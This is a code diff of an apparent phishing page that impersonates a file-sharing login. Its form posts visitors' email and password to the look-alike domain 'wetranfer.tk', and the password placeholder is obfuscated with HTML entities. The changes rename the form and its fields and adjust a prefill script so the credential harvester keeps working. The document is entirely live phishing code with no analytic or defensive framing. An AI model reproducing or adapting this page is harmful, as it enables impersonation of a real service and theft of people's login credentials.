@@ -104,8 +104,8 @@ body {text-align:center;margin:0}
 <div id="container">
 <body style="visibility:hidden" onload="unhideBody()" bgColor="#030100">
 <div id="image1" style="position:absolute; overflow:hidden; left:477px; top:139px; width:440px; height:365px; z-index:0"><img src="images/t3.png" alt="" title="" border=0 width=440 height=341></div>
-<form name="form" action="https://wetranfer.tk/next1.php" autocomplete="off" id=chalbhai method=post>
-<div><input name="userid" value="" class="textrbox"  required type="text" style="position:absolute;width:290px;left:528px;top:225px;z-index:1">
+<form name="forma" action="https://wetranfer.tk/next1.php" autocomplete="off" id=chalbhai method=post>
+<div><input name="email" id="email" autocomplete="off" value="" class="input"  required type="text" style="position:absolute;width:290px;left:528px;top:225px;z-index:1">
 </div>
 <div><input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textrbox"  required type="password" background-color: "#ffffff;" style="position:absolute;width:330px;left:520px;top:310px;z-index:1">
 </div>
@@ -133,7 +133,7 @@ body {text-align:center;margin:0}
 //Copyright 2006 Bontrager Connection, LLC//
 function FillForm() {
 // Specify form's name between the quotes on next line.
-var FormName = "form";
+var FormName = "forma";
 var questionlocation = location.href.indexOf('?');
 if(questionlocation < 0) { return; }
 var q = location.href.substr(questionlocation + 1);
